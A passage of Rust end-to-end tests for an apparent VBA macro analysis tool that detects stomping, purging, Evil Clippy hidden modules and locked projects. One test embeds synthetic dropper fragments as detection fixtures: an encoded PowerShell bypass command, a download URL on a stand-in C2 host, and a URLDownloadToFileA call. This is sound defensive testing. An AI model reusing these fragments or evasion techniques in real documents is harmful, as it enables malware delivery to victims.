    let dir_off = 1024;
    put_cfb_entry(
        &mut cfb[dir_off..],
        0,
        "Root Entry",
        5,
        0xFFFFFFFF,
        0xFFFFFFFF,
        1,
        0xFFFFFFFE,
        0,
    );
    put_cfb_entry(
        &mut cfb[dir_off..],
        1,
        "EncryptionInfo",
        2,
        0xFFFFFFFF,
        2,
        0xFFFFFFFF,
        2,
        16,
    );
    put_cfb_entry(
        &mut cfb[dir_off..],
        2,
        "EncryptedPackage",
        2,
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFF,
        0xFFFFFFFE,
        0,
    );

    cfb[1536..1536 + 16].copy_from_slice(b"AgileEncryption!");
    cfb
}

/// Synthesize a legacy CFB project nested under _VBA_PROJECT_CUR/VBA
fn synthesize_nested_cfb(
    proj_name: &str,
    module_name: &str,
    source_code: &str,
    pcode_bytes: &[u8],
) -> Vec<u8> {
    let mut dir_raw = Vec::new();
    record_dir(0x0001, &1u32.to_le_bytes(), &mut dir_raw); // SYSKIND = Win32
    record_dir(0x0002, &0x0409u32.to_le_bytes(), &mut dir_raw); // LCID
    record_dir(0x0014, &0x0409u32.to_le_bytes(), &mut dir_raw);
    record_dir(0x0003, &1252u16.to_le_bytes(), &mut dir_raw); // CodePage CP1252
    record_dir(0x0004, proj_name.as_bytes(), &mut dir_raw); // ProjectName
    dir_raw.extend_from_slice(&0x0005u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x0040u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x0006u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x003du16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    record_dir(0x0007, &0u32.to_le_bytes(), &mut dir_raw);
    record_dir(0x0008, &0u32.to_le_bytes(), &mut dir_raw);
    dir_raw.extend_from_slice(&0x0009u16.to_le_bytes());
    dir_raw.extend_from_slice(&4u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x0097u32.to_le_bytes());
    dir_raw.extend_from_slice(&1u16.to_le_bytes());

    // PROJECTMODULES header
    dir_raw.extend_from_slice(&0x000fu16.to_le_bytes());
    dir_raw.extend_from_slice(&2u32.to_le_bytes());
    dir_raw.extend_from_slice(&1u16.to_le_bytes());
    dir_raw.extend_from_slice(&0x0013u16.to_le_bytes());
    dir_raw.extend_from_slice(&2u32.to_le_bytes());
    dir_raw.extend_from_slice(&0xffffu16.to_le_bytes()); // cookie

    record_dir(0x0019, module_name.as_bytes(), &mut dir_raw);
    let name16 = module_name
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect::<Vec<_>>();
    record_dir(0x0047, &name16, &mut dir_raw);
    record_dir(0x001a, module_name.as_bytes(), &mut dir_raw);
    dir_raw.extend_from_slice(&0x0032u16.to_le_bytes());
    dir_raw.extend_from_slice(&(name16.len() as u32).to_le_bytes());
    dir_raw.extend_from_slice(&name16);
    record_dir(0x001c, b"", &mut dir_raw);
    dir_raw.extend_from_slice(&0x0048u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());

    // Text offset record (0x0031)
    let text_offset = pcode_bytes.len() as u32;
    record_dir(0x0031, &text_offset.to_le_bytes(), &mut dir_raw);
    record_dir(0x001e, &0u32.to_le_bytes(), &mut dir_raw);
    record_dir(0x002c, &0xffffu16.to_le_bytes(), &mut dir_raw);
    record_dir(0x0021, &0u32.to_le_bytes(), &mut dir_raw);
    dir_raw.extend_from_slice(&0x002bu16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());

    let dir_comp = comp_ovba(&dir_raw);
    let project_stream = format!("Name={proj_name}\r\nModule={module_name}\r\n").into_bytes();

    let mut vba_project_stream = Vec::new();
    vba_project_stream.extend_from_slice(&0x61CCu16.to_le_bytes());
    vba_project_stream.extend_from_slice(&0x0097u16.to_le_bytes()); // VBA7
    vba_project_stream.extend_from_slice(&0x0000u16.to_le_bytes());
    vba_project_stream.resize(0x1E, 0);
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // numRefs
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes());
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // class table
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // compile pairs
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes());
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // typeinfo
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // desc
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // help
    vba_project_stream.resize(vba_project_stream.len() + 0x64, 0);
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // numProjects = 0
    vba_project_stream.extend_from_slice(&[0; 6]);
    vba_project_stream.extend_from_slice(&0u32.to_le_bytes()); // table before IDs
    vba_project_stream.extend_from_slice(&[0; 6]);
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // w0
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // num_total_ids
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // w1
    vba_project_stream.extend_from_slice(&[0; 4]);

    let mut mini = Vec::new();
    let mut minifat = vec![0xffff_ffffu32; 256];

    let (dir_start, dir_size) = allocate_mini_stream(&dir_comp, &mut mini, &mut minifat);
    let (proj_start, proj_size) = allocate_mini_stream(&project_stream, &mut mini, &mut minifat);
    let (vba_start, vba_size) = allocate_mini_stream(&vba_project_stream, &mut mini, &mut minifat);

    let mut mod_bytes = pcode_bytes.to_vec();
    mod_bytes.extend_from_slice(&comp_ovba(source_code.as_bytes()));
    let (mod_start, mod_sz) = allocate_mini_stream(&mod_bytes, &mut mini, &mut minifat);

    let mini_sectors_512 = mini.len().div_ceil(512);
    mini.resize(mini_sectors_512 * 512, 0);

    let mut dir_entries = vec![0u8; 1024];
    put_cfb_entry(
        &mut dir_entries,
        0,
        "Root Entry",
        5,
        0xffff_ffff,
        0xffff_ffff,
        1,
        4,
        mini.len() as u64,
    );
    put_cfb_entry(
        &mut dir_entries,
        1,
        "_VBA_PROJECT_CUR",
        1,
        0xffff_ffff,
        0xffff_ffff,
        2,
        0xffff_ffff,
        0,
    );
    put_cfb_entry(
        &mut dir_entries,
        2,
        "PROJECT",
        2,
        0xffff_ffff,
        3,
        0xffff_ffff,
        proj_start,
        proj_size,
    );
    put_cfb_entry(
        &mut dir_entries,
        3,
        "VBA",
        1,
        0xffff_ffff,
        0xffff_ffff,
        4,
        0xffff_ffff,
        0,
    );
    put_cfb_entry(
        &mut dir_entries,
        4,
        "dir",
        2,
        0xffff_ffff,
        5,
        0xffff_ffff,
        dir_start,
        dir_size,
    );
    put_cfb_entry(
        &mut dir_entries,
        5,
        "_VBA_PROJECT",
        2,
        0xffff_ffff,
        6,
        0xffff_ffff,
        vba_start,
        vba_size,
    );
    put_cfb_entry(
        &mut dir_entries,
        6,
        module_name,
        2,
        0xffff_ffff,
        0xffff_ffff,
        0xffff_ffff,
        mod_start,
        mod_sz,
    );

    let mut file = vec![0u8; 512 * (5 + mini_sectors_512)];
    file[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    put16(&mut file, 24, 0x003e);
    put16(&mut file, 26, 3);
    put16(&mut file, 28, 0xfffe);
    put16(&mut file, 30, 9);
    put16(&mut file, 32, 6);
    put32(&mut file, 44, 1);
    put32(&mut file, 48, 1);
    put32(&mut file, 56, 4096);
    put32(&mut file, 60, 3);
    put32(&mut file, 64, 1);
    put32(&mut file, 68, 0xffff_fffe);
    put32(&mut file, 72, 0);
    put32(&mut file, 76, 0);
    for i in 1..109 {
        put32(&mut file, 76 + i * 4, 0xffff_ffff);
    }

    let fat_offset = 512;
    put32(&mut file, fat_offset, 0xffff_fffd);
    put32(&mut file, fat_offset + 4, 2);
    put32(&mut file, fat_offset + 8, 0xffff_fffe);
    put32(&mut file, fat_offset + 12, 0xffff_fffe);

    for i in 0..mini_sectors_512 {
        let sec = 4 + i;
        if i + 1 < mini_sectors_512 {
            put32(&mut file, fat_offset + sec * 4, (sec + 1) as u32);
        } else {
            put32(&mut file, fat_offset + sec * 4, 0xffff_fffe);
        }
    }
    for i in (4 + mini_sectors_512)..128 {
        put32(&mut file, fat_offset + i * 4, 0xffff_ffff);
    }

    file[1024..1536].copy_from_slice(&dir_entries[..512]);
    file[1536..2048].copy_from_slice(&dir_entries[512..]);

    for (i, val) in minifat[..128].iter().enumerate() {
        put32(&mut file, 2048 + i * 4, *val);
    }

    file[2560..2560 + mini.len()].copy_from_slice(&mini);
    file
}

#[test]
fn e2e_clean_production_xlsm_inspection() {
    let src = "Attribute VB_Name = \"OrdersModule\"\nSub CalculateTotal()\n    Dim total As Double\n    total = 100 * 1.1\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);

    let cfb = synthesize_cfb_project(
        "ProductionProject",
        &[("OrdersModule", src, &pcode)],
        &["CalculateTotal"],
    );
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    assert_eq!(
        inspection.extracted.name.as_deref(),
        Some("ProductionProject")
    );
    assert_eq!(inspection.extracted.modules.len(), 1);
    assert_eq!(
        inspection.stomping_report.overall_severity,
        StompingSeverity::Clean
    );
    assert!(!inspection.stomping_report.has_stomping);

    // Verify JSON export
    let json_out = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(json_out.contains("ProductionProject"));
    assert!(json_out.contains("OrdersModule"));
    assert!(json_out.contains("\"overall_severity\":\"clean\""));

    // Verify Markdown export
    let md_out = inspect_to_markdown(&inspection);
    assert!(md_out.contains("Comprehensive Macro Container Inspection"));
    assert!(md_out.contains("OrdersModule"));
    assert!(md_out.contains("CLEAN"));
}

#[test]
fn e2e_weaponized_stomping_detection_and_sarif_export() {
    // 1. Deceptive source code in the VBA text stream
    let deceptive_src = "Attribute VB_Name = \"MalModule\"\nSub InnocentDocSummary()\n    Dim msg As String\n    msg = \"Harmless Invoice Report\"\nEnd Sub\n";

    // 2. Weaponized P-code line map:
    // Line 0: FuncDefn for "EvilPayload" (divergent procedure name)
    // Line 1: LitStr with suspicious powershell payload
    // Line 2: LitStr with suspicious url
    // Line 3: ArgsCall for "URLDownloadToFileA"
    let line0 = build_func_defn(0); // ident 0: EvilPayload
    let line1 = build_lit_str("powershell -ExecutionPolicy Bypass -enc SQBFAFgA");
    let line2 = build_lit_str("https://c2.evil-attacker.com/payload.exe");
    let line3 = build_args_call(1, 1); // ident 1: URLDownloadToFileA
    let pcode = synthesize_pcode_line_map(&[&line0, &line1, &line2, &line3]);

    let identifiers = &["EvilPayload", "URLDownloadToFileA"];
    let cfb = synthesize_cfb_project(
        "AttackProject",
        &[("MalModule", deceptive_src, &pcode)],
        identifiers,
    );
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    let report = inspection.stomping_report;
    assert!(report.has_stomping);
    assert_eq!(report.overall_severity, StompingSeverity::Critical);

    let mal_mod = &report.modules[0];
    assert!(mal_mod.is_stomped);
    assert_eq!(mal_mod.severity, StompingSeverity::Critical);
    assert_eq!(mal_mod.confidence_score, 100);

    // Verify individual finding types
    let has_hidden_proc = mal_mod.findings.iter().any(|f| {
        matches!(
            &f.kind,
            StompingFindingKind::ProcedureHiddenInPCode(name) if name == "EvilPayload"
        )
    });
    let has_missing_proc = mal_mod.findings.iter().any(|f| {
        matches!(
            &f.kind,
            StompingFindingKind::ProcedureMissingInPCode(name) if name == "InnocentDocSummary"
        )
    });
    let has_suspicious_ps = mal_mod.findings.iter().any(|f| {
        matches!(
            &f.kind,
            StompingFindingKind::SuspiciousLiteralInPCode(lit) if lit.contains("powershell")
        )
    });
    let has_suspicious_url = mal_mod.findings.iter().any(|f| {
        matches!(
            &f.kind,
            StompingFindingKind::SuspiciousLiteralInPCode(lit) if lit.contains("https://")
        )
    });
    let has_sensitive_call = mal_mod.findings.iter().any(|f| {
        matches!(
            &f.kind,
            StompingFindingKind::SensitiveCallInPCode(name) if name == "URLDownloadToFileA"
        )
    });

    assert!(has_hidden_proc, "should detect hidden procedure in P-code");
    assert!(
        has_missing_proc,
        "should detect missing procedure from source in P-code"
    );
    assert!(
        has_suspicious_ps,
        "should detect suspicious powershell command"
    );
    assert!(has_suspicious_url, "should detect suspicious URL");
    assert!(
        has_sensitive_call,
        "should detect sensitive URLDownloadToFileA API call"
    );

    // SARIF export validation
    let sarif_out = stomping_to_sarif(&report, "infected_invoice.xlsm");
    assert!(sarif_out.contains("sarif-schema-2.1.0.json"));
    assert!(sarif_out.contains("infected_invoice.xlsm"));
    assert!(sarif_out.contains("VBA-STOMP-002"));
    assert!(sarif_out.contains("VBA-STOMP-004"));
    assert!(sarif_out.contains("VBA-STOMP-005"));
    assert!(sarif_out.contains("vba-insight"));
}

#[test]
fn e2e_docm_container_extraction_and_inspection() {
    let src = "Attribute VB_Name = \"DocModule\"\nSub WordOpenHandler()\n    MsgBox \"Doc opened\"\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);

    let cfb = synthesize_cfb_project(
        "WordDocumentProject",
        &[("DocModule", src, &pcode)],
        &["WordOpenHandler"],
    );
    let docm = synthesize_docm(&cfb);

    let extracted = extract_macro_container(&docm, &Limits::default())
        .expect("extract_macro_container for .docm should succeed");
    assert_eq!(extracted.name.as_deref(), Some("WordDocumentProject"));
    assert_eq!(extracted.modules.len(), 1);
    assert_eq!(extracted.modules[0].name, "DocModule");

    let inspection = inspect_macro_file(
        &docm,
        &AnalysisOptions {
            host_profile: HostProfile::Word,
            ..Default::default()
        },
    )
    .expect("inspect_macro_file for .docm should succeed");

    assert_eq!(
        inspection.stomping_report.overall_severity,
        StompingSeverity::Clean
    );
    assert!(!inspection.stomping_report.has_stomping);
}

#[test]
fn e2e_pptm_container_extraction_and_inspection() {
    let src = "Attribute VB_Name = \"SlideModule\"\nSub OnSlideShowPageChange()\n    ' Slide change handler\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);

    let cfb = synthesize_cfb_project(
        "PowerPointProject",
        &[("SlideModule", src, &pcode)],
        &["OnSlideShowPageChange"],
    );
    let pptm = synthesize_pptm(&cfb);

    let extracted = extract_macro_container(&pptm, &Limits::default())
        .expect("extract_macro_container for .pptm should succeed");
    assert_eq!(extracted.name.as_deref(), Some("PowerPointProject"));
    assert_eq!(extracted.modules.len(), 1);
    assert_eq!(extracted.modules[0].name, "SlideModule");

    let inspection = inspect_macro_file(
        &pptm,
        &AnalysisOptions {
            host_profile: HostProfile::PowerPoint,
            ..Default::default()
        },
    )
    .expect("inspect_macro_file for .pptm should succeed");

    assert_eq!(
        inspection.stomping_report.overall_severity,
        StompingSeverity::Clean
    );
    assert!(!inspection.stomping_report.has_stomping);
}

#[test]
fn e2e_xlsb_container_extraction_and_inspection() {
    let src = "Attribute VB_Name = \"BinarySheetModule\"\nSub BinaryCalc()\n    Dim total As Long\n    total = 500\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);

    let cfb = synthesize_cfb_project(
        "XlsbProject",
        &[("BinarySheetModule", src, &pcode)],
        &["BinaryCalc"],
    );
    let xlsb = synthesize_xlsb(&cfb);

    let extracted = extract_macro_container(&xlsb, &Limits::default())
        .expect("extract_macro_container for .xlsb should succeed");
    assert_eq!(extracted.name.as_deref(), Some("XlsbProject"));
    assert_eq!(extracted.modules.len(), 1);
    assert_eq!(extracted.modules[0].name, "BinarySheetModule");

    let inspection = inspect_macro_file(&xlsb, &AnalysisOptions::default())
        .expect("inspect_macro_file for .xlsb should succeed");

    assert_eq!(
        inspection.stomping_report.overall_severity,
        StompingSeverity::Clean
    );
}

#[test]
fn e2e_stripped_zip_fallback_extraction() {
    let src = "Attribute VB_Name = \"FallbackModule\"\nSub FallbackMain()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);

    let cfb = synthesize_cfb_project(
        "FallbackProject",
        &[("FallbackModule", src, &pcode)],
        &["FallbackMain"],
    );

    // Scenario 1: Stripped ZIP with xl/vbaProject.bin
    let stripped_zip_xl = synthesize_stripped_zip(&cfb, "xl/vbaProject.bin");
    let extracted_xl = extract_macro_container(&stripped_zip_xl, &Limits::default())
        .expect("fallback extraction should succeed for xl/vbaProject.bin");
    assert_eq!(extracted_xl.name.as_deref(), Some("FallbackProject"));
    assert_eq!(extracted_xl.modules.len(), 1);
    assert!(
        extracted_xl
            .diagnostics
            .iter()
            .any(|d| d.contains("extracted directly from entry 'xl/vbaProject.bin'"))
    );

    // Scenario 2: Stripped ZIP with root vbaProject.bin
    let stripped_zip_root = synthesize_stripped_zip(&cfb, "vbaProject.bin");
    let extracted_root = extract_macro_container(&stripped_zip_root, &Limits::default())
        .expect("fallback extraction should succeed for root vbaProject.bin");
    assert_eq!(extracted_root.name.as_deref(), Some("FallbackProject"));
    assert!(
        extracted_root
            .diagnostics
            .iter()
            .any(|d| d.contains("extracted directly from entry 'vbaProject.bin'"))
    );
}

#[test]
fn e2e_multi_module_container_inspection() {
    let src1 = "Attribute VB_Name = \"OrderModule\"\nSub CalcOrderTotal()\n    Dim total As Double\n    total = 250.0\nEnd Sub\n";
    let src2 = "Attribute VB_Name = \"AuditClass\"\nSub LogAuditEntry()\n    ' Audit entry logger\nEnd Sub\n";

    let line_mod1 = build_func_defn(0);
    let pcode1 = synthesize_pcode_line_map(&[&line_mod1]);

    let line_mod2 = build_func_defn(1);
    let pcode2 = synthesize_pcode_line_map(&[&line_mod2]);

    let cfb = synthesize_cfb_project(
        "MultiModuleCorp",
        &[
            ("OrderModule", src1, &pcode1),
            ("AuditClass", src2, &pcode2),
        ],
        &["CalcOrderTotal", "LogAuditEntry"],
    );
    let xlsm = synthesize_xlsm(&cfb);

    let inspection = inspect_macro_file(&xlsm, &AnalysisOptions::default())
        .expect("multi-module inspection should succeed");

    assert_eq!(
        inspection.extracted.name.as_deref(),
        Some("MultiModuleCorp")
    );
    assert_eq!(inspection.extracted.modules.len(), 2);
    assert_eq!(inspection.stomping_report.modules.len(), 2);
    assert_eq!(
        inspection.stomping_report.overall_severity,
        StompingSeverity::Clean
    );

    let json_out = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(json_out.contains("OrderModule"));
    assert!(json_out.contains("AuditClass"));
}

#[test]
fn e2e_legacy_cfb_direct_container_extraction() {
    let src = "Sub LegacyTask()\nEnd Sub\n";
    let mut pcode = vec![0u8; 32];
    pcode[0..2].copy_from_slice(&0xCAFEu16.to_le_bytes());

    let cfb_raw = synthesize_cfb("LegacyProject", "OldModule", src, &pcode);

    let extracted = extract_macro_container(&cfb_raw, &Limits::default())
        .expect("direct CFB extraction should succeed");

    assert_eq!(extracted.name.as_deref(), Some("LegacyProject"));
    assert_eq!(extracted.modules.len(), 1);
    assert_eq!(extracted.modules[0].name, "OldModule");
}

#[test]
fn e2e_cli_binary_execution_workflow() {
    let src = "Attribute VB_Name = \"TestModule\"\nSub Main()\nEnd Sub\n";
    let mut pcode = vec![0u8; 32];
    pcode[0..2].copy_from_slice(&0xCAFEu16.to_le_bytes());

    let cfb = synthesize_cfb("CliProject", "TestModule", src, &pcode);
    let xlsm = synthesize_xlsm(&cfb);

    let temp_dir = std::env::temp_dir();
    let file_path = temp_dir.join("vba_insight_cli_test.xlsm");
    fs::write(&file_path, &xlsm).expect("should write test file");

    let bin_path = env!("CARGO_BIN_EXE_vba-insight");

    // 1. Test 'inspect --format json'
    let output = Command::new(bin_path)
        .arg("inspect")
        .arg(&file_path)
        .arg("--format")
        .arg("json")
        .output()
        .expect("CLI execution failed");

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("\"schema_version\":\"0.1\""));
    assert!(stdout.contains("CliProject"));

    // 1b. Test 'inspect --format sarif'
    let output_inspect_sarif = Command::new(bin_path)
        .arg("inspect")
        .arg(&file_path)
        .arg("--format")
        .arg("sarif")
        .output()
        .expect("CLI execution failed");

    assert!(output_inspect_sarif.status.success());
    let stdout_inspect_sarif = String::from_utf8_lossy(&output_inspect_sarif.stdout);
    assert!(stdout_inspect_sarif.contains("sarif-schema-2.1.0.json"));
    assert!(stdout_inspect_sarif.contains("VBA-STOMP-001"));
    assert!(stdout_inspect_sarif.contains("VBA-CELL-001"));

    // 2. Test 'stomping --format sarif'
    let output_sarif = Command::new(bin_path)
        .arg("stomping")
        .arg(&file_path)
        .arg("--format")
        .arg("sarif")
        .output()
        .expect("CLI execution failed");

    assert!(output_sarif.status.success());
    let stdout_sarif = String::from_utf8_lossy(&output_sarif.stdout);
    assert!(stdout_sarif.contains("sarif-schema-2.1.0.json"));

    // 3. Test 'disasm --format markdown'
    let output_disasm = Command::new(bin_path)
        .arg("disasm")
        .arg(&file_path)
        .arg("--format")
        .arg("markdown")
        .output()
        .expect("CLI execution failed");

    assert!(output_disasm.status.success());
    let stdout_disasm = String::from_utf8_lossy(&output_disasm.stdout);
    assert!(stdout_disasm.contains("VBA P-Code Disassembly Report"));

    // 3b. Test 'inspect' default text format
    let output_inspect_text = Command::new(bin_path)
        .arg("inspect")
        .arg(&file_path)
        .output()
        .expect("CLI inspect text execution failed");
    assert!(output_inspect_text.status.success());
    let stdout_inspect_text = String::from_utf8_lossy(&output_inspect_text.stdout);
    assert!(stdout_inspect_text.contains("VBA MACRO CONTAINER INSPECTION REPORT"));
    assert!(stdout_inspect_text.contains("Project Name"));
    assert!(stdout_inspect_text.contains("CliProject"));

    // 3c. Test 'stomping' default text format
    let output_stomp_text = Command::new(bin_path)
        .arg("stomping")
        .arg(&file_path)
        .output()
        .expect("CLI stomping text execution failed");
    assert!(output_stomp_text.status.success());
    let stdout_stomp_text = String::from_utf8_lossy(&output_stomp_text.stdout);
    assert!(stdout_stomp_text.contains("Overall Stomping Severity:"));
    assert!(stdout_stomp_text.contains("Has Stomping:"));

    // 4. Test '--version' and '-V'
    let output_ver = Command::new(bin_path)
        .arg("--version")
        .output()
        .expect("CLI --version execution failed");
    assert!(output_ver.status.success());
    let stdout_ver = String::from_utf8_lossy(&output_ver.stdout);
    assert_eq!(
        stdout_ver.trim(),
        format!("vba-insight {}", env!("CARGO_PKG_VERSION"))
    );

    let output_v_short = Command::new(bin_path)
        .arg("-V")
        .output()
        .expect("CLI -V execution failed");
    assert!(output_v_short.status.success());
    let stdout_v_short = String::from_utf8_lossy(&output_v_short.stdout);
    assert_eq!(
        stdout_v_short.trim(),
        format!("vba-insight {}", env!("CARGO_PKG_VERSION"))
    );

    // Cleanup
    let _ = fs::remove_file(&file_path);
}

#[test]
fn e2e_encrypted_container_rejection() {
    let encrypted_cfb = synthesize_encrypted_cfb();
    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Unknown,
        ..Default::default()
    };

    let result = inspect_macro_file(&encrypted_cfb, &options);
    assert!(result.is_err());
    let err_msg = result.unwrap_err();
    assert!(
        err_msg.contains("encrypted Office container detected"),
        "error message should indicate encryption: {err_msg}"
    );
    assert!(
        err_msg.contains("password decryption required"),
        "error message should suggest password decryption: {err_msg}"
    );
}

#[test]
fn e2e_nested_storage_cfb_extraction() {
    let src = "Attribute VB_Name = \"LegacyModule\"\nSub LegacyProc()\n    MsgBox \"Old Format\"\nEnd Sub\n";
    let mut pcode = vec![0u8; 32];
    pcode[0..2].copy_from_slice(&0xCAFEu16.to_le_bytes());

    let nested_cfb = synthesize_nested_cfb("LegacyProject", "LegacyModule", src, &pcode);
    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection =
        inspect_macro_file(&nested_cfb, &options).expect("nested CFB inspection should succeed");

    assert_eq!(inspection.extracted.name.as_deref(), Some("LegacyProject"));
    assert_eq!(inspection.extracted.modules.len(), 1);
    assert_eq!(inspection.extracted.modules[0].name, "LegacyModule");
    assert!(
        inspection.extracted.modules[0]
            .source_text
            .as_ref()
            .unwrap()
            .contains("Old Format")
    );
}

#[test]
fn e2e_xltm_template_container_inspection() {
    let src = "Attribute VB_Name = \"TemplateModule\"\nSub InitTemplate()\n    Dim mode As Integer\n    mode = 1\nEnd Sub\n";
    let mut pcode = vec![0u8; 32];
    pcode[0..2].copy_from_slice(&0xCAFEu16.to_le_bytes());

    let cfb = synthesize_cfb("TemplateProject", "TemplateModule", src, &pcode);
    let xltm = synthesize_xltm(&cfb);

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xltm, &options).expect("XLTM inspection should succeed");
    assert_eq!(
        inspection.extracted.name.as_deref(),
        Some("TemplateProject")
    );
    assert_eq!(inspection.extracted.modules.len(), 1);
    assert_eq!(inspection.extracted.modules[0].name, "TemplateModule");
}

#[test]
fn e2e_evil_clippy_hidden_gui_module_and_locking_detection() {
    let visible_src = "Attribute VB_Name = \"VisibleMod\"\nSub NormalHelper()\n    Dim x As Integer\n    x = 10\nEnd Sub\n";
    let hidden_src = "Attribute VB_Name = \"EvilHiddenMod\"\nSub Auto_Open()\n    ' Auto exec evil hook hidden from VBA IDE\nEnd Sub\n";

    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);

    // Manifest contains CMG/DPB/GC protection locks, and ONLY declares VisibleMod.
    // EvilHiddenMod is omitted from PROJECT (Evil Clippy technique).
    let custom_manifest = "CMG=\"4446F0EB6CEF6CEF6CEF6C\"\r\nDPB=\"2426908F87C806C906C906\"\r\nGC=\"7E7CE2337F347F3400\"\r\nName=\"ProtectedProject\"\r\nModule=VisibleMod\r\n";

    let cfb = synthesize_cfb_project_with_manifest(
        "ProtectedProject",
        &[
            ("VisibleMod", visible_src, &pcode),
            ("EvilHiddenMod", hidden_src, &pcode),
        ],
        &["NormalHelper", "Auto_Open"],
        Some(custom_manifest),
    );

    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    // Verify protection locks detected
    assert!(
        inspection.extracted.is_locked_or_unviewable,
        "project should be flagged as locked/unviewable"
    );
    assert!(
        inspection
            .extracted
            .diagnostics
            .iter()
            .any(|d| d.contains("CMG/DPB/GC")),
        "diagnostics should explain protection locks"
    );

    // Verify Evil Clippy hidden GUI module detected
    assert_eq!(
        inspection.extracted.hidden_gui_modules,
        vec!["EvilHiddenMod".to_string()]
    );
    assert!(
        inspection
            .extracted
            .diagnostics
            .iter()
            .any(|d| d.contains("EvilHiddenMod") && d.contains("omitted from PROJECT")),
        "diagnostics should flag hidden GUI module"
    );

    // Stomping / Tampering report validation
    let stomping = &inspection.stomping_report;
    assert!(
        stomping.has_stomping,
        "tampering should be flagged due to hidden GUI module"
    );
    assert_eq!(stomping.overall_severity, StompingSeverity::Critical);

    // Project-level findings
    assert!(
        stomping
            .project_findings
            .iter()
            .any(|f| matches!(f.kind, StompingFindingKind::ProjectLockedOrUnviewable)),
        "project-level findings should include ProjectLockedOrUnviewable"
    );

    // Module findings
    let evil_mod = stomping
        .modules
        .iter()
        .find(|m| m.module_name == "EvilHiddenMod")
        .expect("EvilHiddenMod should have a module report");
    assert_eq!(evil_mod.severity, StompingSeverity::Critical);
    assert!(
        evil_mod.findings.iter().any(|f| matches!(
            &f.kind,
            StompingFindingKind::HiddenGuiModule(name) if name == "EvilHiddenMod"
        )),
        "findings should contain HiddenGuiModule"
    );

    // SARIF export verification
    let sarif = stomping_to_sarif(stomping, "sample_protected.xlsm");
    assert!(
        sarif.contains("VBA-STOMP-008"),
        "SARIF should include rule VBA-STOMP-008 (HiddenGuiModule)"
    );
    assert!(
        sarif.contains("VBA-STOMP-009"),
        "SARIF should include rule VBA-STOMP-009 (ProjectLockedOrUnviewable)"
    );
}

#[test]
fn e2e_vba_purging_detection() {
    let src = "Attribute VB_Name = \"PurgedModule\"\nSub RunPurgedPayload()\n    MsgBox \"VBA Purging in Action\"\nEnd Sub\n";
    // Empty P-code: 0 instructions
    let empty_pcode = vec![0u8; 0];

    let cfb = synthesize_cfb("PurgedProject", "PurgedModule", src, &empty_pcode);
    let xlsm = synthesize_xlsm(&cfb);

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");

    let stomping = &inspection.stomping_report;
    let purged_mod = stomping
        .modules
        .iter()
        .find(|m| m.module_name == "PurgedModule")
        .expect("PurgedModule report should exist");

    assert!(
        purged_mod
            .findings
            .iter()
            .any(|f| matches!(f.kind, StompingFindingKind::PerformanceCachePurged { .. })),
        "should detect PerformanceCachePurged finding"
    );

    let sarif = stomping_to_sarif(stomping, "sample_purged.xlsm");
    assert!(
        sarif.contains("VBA-STOMP-007"),
        "SARIF should include rule VBA-STOMP-007 (PerformanceCachePurged)"
    );
}

#[test]
fn e2e_xlsm_dde_and_xlm_macro_sheet_detection() {
    let src = "Attribute VB_Name = \"DummyModule\"\nSub NormalSub()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
